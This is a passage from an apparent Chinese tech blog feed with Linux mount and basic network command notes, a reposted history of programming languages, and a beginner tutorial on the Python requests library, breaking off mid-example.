吗，直接对它操作不就行了？这不是它的目录吗？</p></li><li><p>这不是它的目录。虽然/dev是个目录，但/dev/sdb1不是目录。可以发现ls/dev/sdb1无法执行。/dev/sdb1，是一个类似指针的东西，指向这个分区的原始数据块。mount前，系统并不知道这个数据块哪部分数据代表文件，如何对它们操作。</p></li><li><p>插入CD，系统其实自动执行了 mount /dev/cdrom /media/cdrom。所以可以直接在/media/cdrom中对CD中的内容进行管理。</p></li></ol></blockquote><p><code>功能</code>：是经常会使用到的命令，它用于挂载Linux系统外的文件</p><p><code>案例</code>：</p><p>将 /dev/hda1 挂在 /mnt 之下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/hda1 /mnt（空目录）</span><br></pre></td></tr></table></figure><p>将 /dev/hda1 用唯读模式挂在 /mnt 之下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o ro /dev/hda1 /mnt</span><br></pre></td></tr></table></figure><p>将 /tmp/image.iso 这个光碟的 image 档使用 loop 模式挂在 /mnt/cdrom之下。用这种方法可以将一般网络上可以找到的 Linux 光 碟 ISO 档在不烧录成光碟的情况下检视其内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#mount -o loop /tmp/image.iso /mnt/cdrom</span><br></pre></td></tr></table></figure><p><strong>光盘挂载</strong></p><blockquote><p>/dev/sda1 第一个scsi硬盘的第一分区</p><p>/dev/cdrom 光盘</p><p>/dev/hdc IDE硬盘 centos 5.5</p><p>/dev/sr0 光盘 centos 6.x</p><p>mount -t 文件系统 设备描述文件 挂载点（已经存在空目录）mount -t iso9660 /dev/cdrom /mnt/cdrom</p></blockquote><p><strong>光盘卸载</strong></p><blockquote><p>umount /dev/cdrom</p><p>umount /mnt/cdrom 注意：退出挂载目录，才能卸载</p><p>fdisk -l 查看设备名</p><p>mount -t vfat /dev/sdb1 /mnt/usb</p></blockquote><h3 id="font-color-brown0x06-网络命令font"><a class="markdownIt-Anchor" href="#font-color-brown0x06-网络命令font"></a> <font color="brown"><code>0x06 网络命令</code></font></h3><h4 id="font-color-navy0x00-pingfont"><a class="markdownIt-Anchor" href="#font-color-navy0x00-pingfont"></a> <font color="navy"><code>0x00 ping</code></font></h4><p><code>功能</code>：测试网络畅通性</p><p><code>命令格式</code>：<code>ping -c 次数 ip</code></p><h4 id="font-color-navy0x01-ifconfigfont"><a class="markdownIt-Anchor" href="#font-color-navy0x01-ifconfigfont"></a> <font color="navy"><code>0x01 ifconfig</code></font></h4><p><code>功能</code>：查询本机网络信息</p><h4 id="font-color-navy0x02-scpfont"><a class="markdownIt-Anchor" href="#font-color-navy0x02-scpfont"></a> <font color="navy"><code>0x02 scp</code></font></h4><p><code>功能</code>：从服务器上下载文件</p><p><code>命令格式</code>：<code>scp -P 2222 username@servername:remote_dir/ /tmp/local_dir</code></p><p><code>实例</code>：从pwnable.kr上面下载文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2222 fd@pwnable.kr:/home/fd/fd.c /home/mask/</span><br></pre></td></tr></table></figure><h4 id="font-color-navy0x03-其他命令font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-其他命令font"></a> <font color="navy"><code>0x03 其他命令</code></font></h4><blockquote><p>其他相关命令见我转载的一篇博客：<a href="http://vbird.dic.ksu.edu.tw/linux_server/0140networkcommand/0140networkcommand-centos4.php" target="_blank" rel="noopener"><strong>Linux 常用网络命令介绍</strong></a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown0x00-目录操作命令font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown0x00-目录操作命令font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;&lt;code
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="知识库" scheme="https://muzibing.github.io/tags/%E7%9F%A5%E8%AF%86%E5%BA%93/"/>
    
      <category term="Linux" scheme="https://muzibing.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>编程语言的发展历史 from1954to2019</title>
    <link href="https://muzibing.github.io/2020/03/18/2020.03.17%EF%BC%88103%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/18/2020.03.17（103）/</id>
    <published>2020-03-17T16:00:00.000Z</published>
    <updated>2020-03-18T13:34:25.748Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/103-1.jpg" alt></p><blockquote><p>转载：<a href="https://www.levenez.com/lang/" target="_blank" rel="noopener"><strong>Computer Languages History</strong></a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/images/103-1.jpg&quot; alt&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;转载：&lt;a href=&quot;https://www.levenez.com/lang/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;strong&gt;C
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>知识库构建初想</title>
    <link href="https://muzibing.github.io/2020/03/16/2020.03.16%EF%BC%88102%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/16/2020.03.16（102）/</id>
    <published>2020-03-15T16:00:00.000Z</published>
    <updated>2020-03-16T14:51:30.639Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>随着安全学习的不断深入，发现做笔记以及积累的重要性，这段时间在我脑海里一直有个想法出现，那就是做专题知识点总结，包括web、二进制、密码学</p></blockquote><h3 id="font-colorbrownwebfont"><a class="markdownIt-Anchor" href="#font-colorbrownwebfont"></a> <font color="brown"><code>WEB</code></font></h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;随着安全学习的不断深入，发现做笔记以及积累的重要性，这段时间在我脑海里一直有个想法出现，那就是做专题知识点总结，包括web、二进制、密码学&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;font-colorbrownwebfont&quot;&gt;&lt;a c
      
    
    </summary>
    
    
      <category term="知识库" scheme="https://muzibing.github.io/tags/%E7%9F%A5%E8%AF%86%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>Python基本第三方库总结（0x00）：requests库（Python中唯一的非转基因库）</title>
    <link href="https://muzibing.github.io/2020/03/15/2020.03.15%EF%BC%88101%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/15/2020.03.15（101）/</id>
    <published>2020-03-14T16:00:00.000Z</published>
    <updated>2020-03-15T14:47:19.344Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>首先来看一下基本第三方库有什么？</p></blockquote><table><thead><tr><th style="text-align:center">库名</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center"><strong>Requests</strong></td><td style="text-align:center"><strong>Kenneth Reitz写的最富盛名的http库。每个Python程序员都应该有它</strong></td></tr><tr><td style="text-align:center"><strong>Scrapy</strong></td><td style="text-align:center"><strong>爬虫相关的工作</strong></td></tr><tr><td style="text-align:center">Re</td><td style="text-align:center">Python 中的正则表达式，与Requests库结合用</td></tr><tr><td style="text-align:center">wxPython</td><td style="text-align:center">Python的一个GUI（图形用户界面）工具，替代tkinter</td></tr><tr><td style="text-align:center"><strong>Pillow</strong></td><td style="text-align:center"><strong>是PIL（Python图形库）的一个友好分支。对于用户比PIL更加友好，对于任何在图形领域工作的人是必备的库</strong></td></tr><tr><td style="text-align:center">SQLAlchemy</td><td style="text-align:center">一个数据库的库</td></tr><tr><td style="text-align:center"><strong>BeautifulSoup</strong></td><td style="text-align:center"><strong>这个xml和html的解析库对于新手非常有用</strong></td></tr><tr><td style="text-align:center">Twisted</td><td style="text-align:center">对于网络应用开发者最重要的工具。它有非常优美的api，被很多Python开发大牛使用</td></tr><tr><td style="text-align:center">NumPy</td><td style="text-align:center">它为Python提供了很多高级的数学方法</td></tr><tr><td style="text-align:center">SciPy</td><td style="text-align:center">是一个Python的算法和数学工具库，它的功能把很多科学家从Ruby吸引到了Python</td></tr><tr><td style="text-align:center">matplotlib</td><td style="text-align:center">一个绘制数据图的库。对于数据科学家或分析师非常有用</td></tr><tr><td style="text-align:center"><strong>Pygame</strong></td><td style="text-align:center"><strong>哪个程序员不喜欢玩游戏和写游戏？这个库会让你在开发2D游戏的时候如虎添翼</strong></td></tr><tr><td style="text-align:center">Pyglet</td><td style="text-align:center">D动画和游戏开发引擎。非常有名的Python版本Minecraft就是用这个引擎做的</td></tr><tr><td style="text-align:center">pyQT</td><td style="text-align:center">Python的GUI工具。这是我在给Python脚本开发用户界面时次于wxPython的选择</td></tr><tr><td style="text-align:center">pyGtk</td><td style="text-align:center">也是Python GUI库。很有名的Bittorrent客户端就是用它做的</td></tr><tr><td style="text-align:center">Scapy</td><td style="text-align:center">用Python写的数据包探测和分析库</td></tr><tr><td style="text-align:center">pywin32</td><td style="text-align:center">一个提供和windows交互的方法和类的Python库</td></tr><tr><td style="text-align:center">nltk</td><td style="text-align:center">自然语言工具包。我知道大多数人不会用它，但它通用性非常高。如果你需要处理字符串的话，它是非常好的库。但它的功能远远不止如此，自己摸索一下吧</td></tr><tr><td style="text-align:center">nose</td><td style="text-align:center">Python的测试框架。被成千上万的Python程序员使用</td></tr><tr><td style="text-align:center">SymPy</td><td style="text-align:center">SymPy可以做代数评测、差异化、扩展、复数等等。它封装在一个纯Python发行版本里。</td></tr><tr><td style="text-align:center"><strong>IPython</strong></td><td style="text-align:center"><strong>怎么称赞这个工具的功能都不为过。它把Python的提示信息做到了极致。包括完成信息、历史信息、shell功能，以及其他很多很多方面。一定要研究一下它。</strong></td></tr><tr><td style="text-align:center"><strong>hashlib</strong></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">base64</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">os</td><td style="text-align:center"></td></tr></tbody></table><blockquote><p>在入手阶段，先挑几个重点库（字体加粗的）进行学习和总结：<strong>Requests</strong>、<strong>base64</strong>、<strong>hashlib</strong>、<strong>Re、BeautifulSoup</strong>、<strong>Pillow</strong>、<strong>os</strong>、<strong>Pygame</strong>、<strong>Scrapy</strong>、<strong>IPython</strong></p></blockquote><h3 id="1requests-库的基本用法"><a class="markdownIt-Anchor" href="#1requests-库的基本用法"></a> <code>1.Requests 库的基本用法</code></h3><p>首先来见识一下 <code>Requests</code> 库的威力：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">"https://api.github.com/user"</span>, auth=(<span class="string">'user'</span>, <span class="string">'pass'</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">200</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers[<span class="string">"content-type"</span>] </span><br><span class="line"><span class="string">'application/json; charset=utf8'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.encoding</span><br><span class="line"><span class="string">"utf-8"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line"><span class="string">u'&#123;"type":"User"...'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.json()</span><br><span class="line">&#123;<span class="string">u'private_gists'</span>: <span class="number">419</span>, <span class="string">u'total_private_repos'</span>: <span class="number">77</span>, ...&#125;</span><br></pre></td></tr></table></figure><h4 id="11-功能特性"><a class="markdownIt-Anchor" href="#11-功能特性"></a> <code>1.1 功能特性</code></h4><blockquote><ul><li>Keep-Alive &amp; 连接池</li><li>国际化域名和 URL</li><li>带持久 Cookie 的会话</li><li>浏览器式的 SSL 认证</li><li>自动内容解码</li><li>基本/摘要式的身份认证</li><li>优雅的 key/value Cookie</li><li>自动解压</li><li>Unicode 响应体</li><li>HTTP(S) 代理支持</li><li>文件分块上传</li><li>流下载</li><li>连接超时</li><li>分块请求</li><li>支持 <code>.netrc</code></li></ul></blockquote><h4 id="12-两个主要请求方法"><a class="markdownIt-Anchor" href="#12-两个主要请求方法"></a> <code>1.2 两个主要请求方法</code></h4><p><code>GET</code></p><blockquote><p>一般的请求方式</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(URL)</span><br></pre></td></tr></table></figure><blockquote><p>带有参数的请求方式</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> payload = &#123;<span class="string">'key1'</span>: <span class="string">'value1'</span>, <span class="string">'key2'</span>: [<span class="string">'value2'</span>, <span class="string">'value3'</span>],<span class="string">"key3"</span>:<span class="string">"none"</span>&#125; //注意字典里值为 <span class="keyword">None</span> 的键都不会被添加到 URL 的查询字符串里。</span><br><span class="line">r = requests.get(URL, params=payload) // 第一种方式</span><br><span class="line"><span class="comment">##############################################################</span></span><br><span class="line">r = requests.get(URL, params=&#123;<span class="string">"key1"</span>:<span class="string">"value1"</span>,<span class="string">"key2"</span>:<span class="string">"value2"</span>&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>带有请求头其他参数的方式</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(URL, headers=&#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit'</span>&#125;)</span><br></pre></td></tr></table></figure><p><code>POST</code></p><blockquote><p>一般的请求方式</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = requests.post(URL)</span><br></pre></td></tr></table></figure><blockquote><p>带有参数的请求方式</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">r = requests.post(<span class="string">"URL"</span>,data = &#123;<span class="string">'key'</span>:<span class="string">'value'</span>&#125;)  <span class="comment"># 注意，如果POST请求需要传递json对象，需要使用json库的dumps()函数做一步转换</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#########################################################################################</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'https://api.github.com/some/endpoint'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = &#123;<span class="string">'some'</span>: <span class="string">'data'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, data=json.dumps(payload))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此处除了可以自行对 dict 进行编码，你还可以使用 json 参数直接传递，然后它就会被自动编码。这是 2.4.2 版的新加功能：</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'https://api.github.com/some/endpoint'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = &#123;<span class="string">'some'</span>: <span class="string">'data'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, json=payload)</span><br></pre></td></tr></table></figure><blockquote><p>带有请求头其他参数的方式同 <code>GET</code> 的方式一样</p></blockquote><h4 id="13-响应内容"><a class="markdownIt-Anchor" href="#13-响应内容"></a> <code>1.3 响应内容</code></h4><p><code>requests 响应的属性</code></p><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">信息</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">r.url</td><td style="text-align:center">HTTP 请求的网址</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">r.headers</td><td style="text-align:center">获得头部信息</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">r.text</td><td style="text-align:center">HTTP响应内容的字符串形式，即：url对应的页面内容</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">r.content</td><td style="text-align:center">HTTP响应内容的二进制形式</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">r.status_code</td><td style="text-align:center">HTTP请求的返回状态（状态码）</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">r.cookies</td><td style="text-align:center">网站的cookies</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">r.encoding</td><td style="text-align:center">从HTTP header中猜测的响应内容编码方式</td><td style="text-align:center">能够更改</td></tr><tr><td style="text-align:center">r.apparent_encoding</td><td style="text-align:center">从内容中分析出的响应内容编码方式（备选编码方式）</td><td style="text-align:center"></td></tr></tbody></table><blockquote><p>如果你改变了编码，每当你访问 <code>r.text</code> ，Request 都将会使用 <code>r.encoding</code> 的新值。你可能希望在使用特殊逻辑计算出文本的编码的情况下来修改编码。比如 HTTP 和 XML 自身可以指定编码。这样的话，你应该使用 <code>r.content</code> 来找到编码，然后设置 <code>r.encoding</code> 为相应的编码。这样就能使用正确的编码解析 <code>r.text</code> 了。</p><p>在你需要的情况下，Requests 也可以使用定制的编码。如果你创建了自己的编码，并使用 <code>codecs</code> 模块进行注册，你就可以轻松地使用这个解码器名称作为 <code>r.encoding</code> 的值， 然后由 Requests 来为你处理编码。</p></blockquote><p><code>二进制响应内容</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.content</span><br><span class="line"><span class="string">b'[&#123;"repository":&#123;"open_issues":0,"url":"https://github.com/...</span></span><br></pre></td></tr></table></figure><p>Requests 会自动为你解码 <code>gzip</code> 和 <code>deflate</code> 传输编码的响应数据，例如，以请求返回的二进制数据创建一张图片，你可以使用如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>i = Image.open(BytesIO(r.content))</span><br></pre></td></tr></table></figure><p><code>Json 响应内容</code></p><p>Requests 中也有一个内置的 JSON 解码器，助你处理 JSON 数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">"https://api.github.com/events"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.json()</span><br><span class="line">[&#123;<span class="string">u'repository'</span>: &#123;<span class="string">u'open_issues'</span>: <span class="number">0</span>, <span class="string">u'url'</span>: <span class="string">'https://github.com/...</span></span><br></pre></td></tr></table></figure><blockquote><p>如果 JSON 解码失败， <code>r.json()</code> 就会抛出一个异常。例如，响应内容是 401 (Unauthorized)，尝试访问 <code>r.json()</code> 将会抛出 <code>ValueError: No JSON object could be decoded</code> 异常。</p><p>需要注意的是，成功调用 <code>r.json()</code> 并<strong>不</strong>意味着响应的成功。有的服务器会在失败的响应中包含一个 JSON 对象（比如 HTTP 500 的错误细节）。这种 JSON 会被解码返回。要检查请求是否成功，请使用 <code>r.raise_for_status()</code> 或者检查 <code>r.status_code</code> 是否和你的期望相同。</p></blockquote><p><code>1.4 响应状态码</code></p><p>我们可以检测状态码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://httpbin.org/get'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">200</span></span><br></pre></td></tr></table></figure><p>为方便引用，Requests还附带了一个内置的状态码查询对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code == requests.codes.ok</span><br><span class="line"><span class="keyword">True</span></span><br></pre></td></tr></table></figure><p>如果发送了一个错误请求(一个 4XX 客户端错误，或者 5XX 服务器错误响应)，我们可以通过 <a href="https://requests.readthedocs.io/zh_CN/latest/api.html#requests.Response.raise_for_status" target="_blank" rel="noopener"><code>Response.raise_for_status()</code></a> 来抛出异常：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bad_r.status_code</span><br><span class="line"><span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bad_r.raise_for_status()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"requests/models.py"</span>, line <span class="number">832</span>, <span class="keyword">in</span> raise_for_status</span><br><span class="line">    <span class="keyword">raise</span> http_error</span><br><span class="line">requests.exceptions.HTTPError: <span class="number">404</span> Client Error</span><br></pre></td></tr></table></figure><h4 id="14-cookie"><a class="markdownIt-Anchor" href="#14-cookie"></a> <code>1.4 Cookie</code></h4><p>如果某个响应中包含一些 cookie，你可以快速访问它们：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://example.com/some/cookie/setting/url'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.cookies[<span class="string">'example_cookie_name'</span>]</span><br><span class="line"><span class="string">'example_cookie_value'</span></span><br></pre></td></tr></table></figure><p>要想发送你的cookies到服务器，可以使用 <code>cookies</code> 参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>cookies = dict(cookies_are=<span class="string">'working'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url, cookies=cookies)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line"><span class="string">'&#123;"cookies": &#123;"cookies_are": "working"&#125;&#125;'</span></span><br></pre></td></tr></table></figure><h4 id="15-重定向与请求历史"><a class="markdownIt-Anchor" href="#15-重定向与请求历史"></a> <code>1.5 重定向与请求历史</code></h4><p>默认情况下，除了 HEAD, Requests 会自动处理所有重定向。</p><p>可以使用响应对象的 <code>history</code> 方法来追踪重定向。</p><p><a href="https://requests.readthedocs.io/zh_CN/latest/api.html#requests.Response.history" target="_blank" rel="noopener"><code>Response.history</code></a> 是一个 <a href="https://requests.readthedocs.io/zh_CN/latest/api.html#requests.Response" target="_blank" rel="noopener"><code>Response</code></a> 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。</p><p>例如，Github 将所有的 HTTP 请求重定向到 HTTPS：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://github.com'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.url</span><br><span class="line"><span class="string">'https://github.com/'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.history</span><br><span class="line">[&lt;Response [<span class="number">301</span>]&gt;]</span><br></pre></td></tr></table></figure><h4 id="16-超时"><a class="markdownIt-Anchor" href="#16-超时"></a> <code>1.6 超时</code></h4><p>可以告诉 requests 在经过以 <code>timeout</code> 参数设定的秒数时间之后停止等待响应。基本上所有的生产代码都应该使用这一参数。如果不使用，你的程序可能会永远失去响应：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'http://github.com'</span>, timeout=<span class="number">0.001</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">requests.exceptions.Timeout: HTTPConnectionPool(host=<span class="string">'github.com'</span>, port=<span class="number">80</span>): Request timed out. (timeout=<span class="number">0.001</span>)</span><br></pre></td></tr></table></figure><blockquote><p>注意：<code>timeout</code> 仅对连接过程有效，与响应体的下载无关。 <code>timeout</code> 并不是整个下载响应的时间限制，而是如果服务器在 <code>timeout</code> 秒内没有应答，将会引发一个异常（更精确地说，是在 <code>timeout</code> 秒内没有从基础套接字上接收到任何字节的数据时）If no timeout is specified explicitly, requests do not time out.</p></blockquote><h3 id="2-requests-库的高级用法"><a class="markdownIt-Anchor" href="#2-requests-库的高级用法"></a> <code>2 requests 库的高级用法</code></h3><h4 id="21-会话对象session"><a class="markdownIt-Anchor" href="#21-会话对象session"></a> <code>2.1 会话对象Session</code></h4><p>会话对象让你能够跨请求保持某些参数。它也会在同一个 Session 实例发出的所有请求之间保持 cookie， 期间使用 <code>urllib3</code> 的 <a href="http://urllib3.readthedocs.io/en/latest/reference/index.html#module-urllib3.connectionpool" target="_blank" rel="noopener">connection pooling</a> 功能。所以如果你向同一主机发送多个请求，底层的 TCP 连接将会被重用，从而带来显著的性能提升。 (参见 <a href="https://en.wikipedia.org/wiki/HTTP_persistent_connection" target="_blank" rel="noopener">HTTP persistent connection</a>).</p><p>会话对象具有主要的 Requests API 的所有方法。我们来跨请求保持一些 cookie:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">s.get(<span class="string">'http://httpbin.org/cookies/set/sessioncookie/123456789'</span>)</span><br><span class="line">r = s.get(<span class="string">"http://httpbin.org/cookies"</span>)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br><span class="line"><span class="comment"># '&#123;"cookies": &#123;"sessioncookie": "123456789"&#125;&#125;'</span></span><br></pre></td></tr></table></figure><h4 id="22-请求与响应对象"><a class="markdownIt-Anchor" href="#22-请求与响应对象"></a> <code>2.2 请求与响应对象</code></h4><p>任何时候进行了类似 requests.get() 的调用，你都在做两件主要的事情。其一，你在构建一个 Request 对象， 该对象将被发送到某个服务器请求或查询一些资源。其二，一旦 <code>requests</code> 得到一个从服务器返回的响应就会产生一个 <code>Response</code> 对象。该响应对象包含服务器返回的所有信息，也包含你原来创建的 <code>Request</code> 对象。如下是一个简单的请求，从 Wikipedia 的服务器得到一些非常重要的信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://en.wikipedia.org/wiki/Monty_Python'</span>)</span><br></pre></td></tr></table></figure><p>如果想访问服务器返回给我们的响应头部信息，可以这样做：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers</span><br><span class="line">&#123;<span class="string">'content-length'</span>: <span class="string">'56170'</span>, <span class="string">'x-content-type-options'</span>: <span class="string">'nosniff'</span>, <span class="string">'x-cache'</span>:</span><br><span class="line"><span class="string">'HIT from cp1006.eqiad.wmnet, MISS from cp1010.eqiad.wmnet'</span>, <span class="string">'content-encoding'</span>:</span><br><span class="line"><span class="string">'gzip'</span>, <span class="string">'age'</span>: 